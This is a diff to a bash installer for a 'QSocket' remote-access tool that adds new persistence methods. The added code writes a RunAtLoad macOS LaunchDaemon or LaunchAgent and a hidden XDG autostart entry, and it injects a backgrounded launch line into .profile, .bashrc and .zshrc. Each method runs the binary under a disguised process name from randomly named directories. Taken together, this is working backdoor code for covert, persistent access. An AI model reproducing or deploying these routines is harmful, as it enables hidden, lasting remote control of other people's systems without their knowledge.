@@ -240,7 +240,7 @@ unpack_util() {
 # Test if directory can be used to store executeable
 # try_dstdir "/tmp/.qs-foobar/xxx"
 # Return 0 on success.
-check_dir(){
+check_exec_dir(){
 	[[ ! -d "`dirname $i`" ]] && print_verbose "$i is not a directory!" && return 1
 	[[ ! -w "$1" ]] && print_verbose "$1 directory not writable!" && return 1;
 	[[ ! -x "$1" ]] && print_verbose "$1 directory not executable!" && return 1;
@@ -271,7 +271,7 @@ create_qs_dir() {
 		for i in ${root_dirs[@]}; do
 			[[ ! -d $i ]] && continue
 			xmkdir "$i/$rand_dir" "/etc" || continue
-			check_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
+			check_exec_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
 			rm -rfv "$i/$rand_dir" &>$ERR_LOG
 		done
 	fi
@@ -280,7 +280,7 @@ create_qs_dir() {
 	for i in ${user_dirs[@]}; do
 		[[ ! -d $i ]] && continue
 		xmkdir "$i/$rand_dir" "/etc" || continue
-		check_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
+		check_exec_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
 		rm -rfv "$i/$rand_dir" &>$ERR_LOG
   	done
 
@@ -334,21 +334,66 @@ exec_hidden() {
 	disown -a &> $ERR_LOG
 }
 
-install_user() {
+
+setup_macos_login_item() {
+  local item_plist="
+<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+<!DOCTYPE plist PUBLIC -//Apple Computer//DTD PLIST 1.0//EN http://www.apple.com/DTDs/PropertyList-1.0.dtd >
+<plist version=\"1.0\">
+<dict>
+    <key>Label</key>
+    <string>org.$RAND_NAME</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/bin/bash</string>
+        <string>-c</string>
+        <string>QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>"
+  local item_plist_path="/Library/LaunchDaemons/org.$RAND_NAME.plist"
+  [[ $1 == "user" ]] && item_plist_path="${HOME}/Library/LaunchAgents/org.$RAND_NAME.plist"
+  [[ -d "$(dirname $item_plist_path)" ]] || return 1
+  echo "$item_plist" > "$item_plist_path"
+  [[ -f "$item_plist_path" ]] || return 1
+  return 0
+}
+
+install_desktop_autostart() {
+  local desktop_entry="
+[Desktop Entry]
+Name=$RAND_NAME
+Exec=/bin/bash -c \"QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
+Terminal=false
+Type=Application
+StartupNotify=false
+Hidden=true"
+
+  [[ -d "$HOME/.config/autostart" ]] || return 1
+  local desktop_entry_path="$HOME/.config/autostart/$RAND_NAME.desktop"
+  echo "$desktop_entry" > "$desktop_entry_path" 
+  [[ -f $desktop_entry_path ]] || return 1 
+  return 0
+}
+
+install_init_scripts() {
 	inject_targets=(
 		"$HOME/.profile"
 		"$HOME/.bashrc"
 		"$HOME/.zshrc"
 	)
-	
+
 	local success=""
 	INJECT_LINE="set +m; HOME=$HOME TERM=\"xterm-256color\" SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
 	for target in ${inject_targets[@]}; do
 		grep -q QS_ARGS $target &>$ERR_LOG && print_status "!! WARNING !! QSocket access already installed via `basename $target`" && continue 
 		[[ ! -f $target ]] && continue
 		print_progress "Installing access via `basename $target`"
-  		inject_to_file "$target" "$INJECT_LINE" && print_ok && success=1 || print_fail 
+  	inject_to_file "$target" "$INJECT_LINE" && print_ok && success=1 || print_fail 
 	done
+
 	[[ -z $success ]] && return 1
 	return 0
 }
@@ -358,15 +403,26 @@ install() {
 	print_progress "Installing systemwide remote access permanentally" && print_ok
 
 	## Root install methods
-	if [[ $UID -eq 0 ]];then 
-		print_progress "Installing access via systemd"
+	if [[ $UID -eq 0 ]];then
+    if [[ $OS_NAME == "darwin" ]];then 
+      print_progress "Installing access via login item"
+      setup_macos_login_item && print_ok && return 0 || print_fail
+    fi
+    print_progress "Installing access via systemd"
 		install_system_systemd && print_ok && return 0 || print_fail
 		print_progress "Installing access via rc.local"
 	 	install_system_rclocal && print_ok && return 0 || print_fail
 	fi
-	## User install methods
-	install_user && return 0
-	print_error "All installation methods failed!"
+  ## User install methods
+  if [[ $OS_NAME == "darwin" ]];then 
+    print_progress "Installing access via login item"
+    setup_macos_login_item "user" && print_ok || print_fail
+  else
+    print_progress "Installing access via autostart"
+    install_desktop_autostart && print_ok || print_fail
+  fi
+  ## Also inject into several init scripts just in case
+	install_init_scripts && return 0
 	return 1
 }
 
